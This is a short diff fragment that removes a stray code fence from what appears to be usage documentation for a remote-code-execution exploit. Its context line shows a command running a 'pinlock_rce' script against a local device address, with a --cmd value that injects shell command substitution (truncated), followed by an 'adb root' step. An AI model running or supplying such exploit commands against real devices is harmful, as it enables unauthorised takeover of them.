@@ -8,4 +8,3 @@ python jodu5174x_pinlock_rce.py https://192.168.225.1/ --ask-pass --cmd 'Aa1$(/s
 ```bash
 adb root
 ```
-```
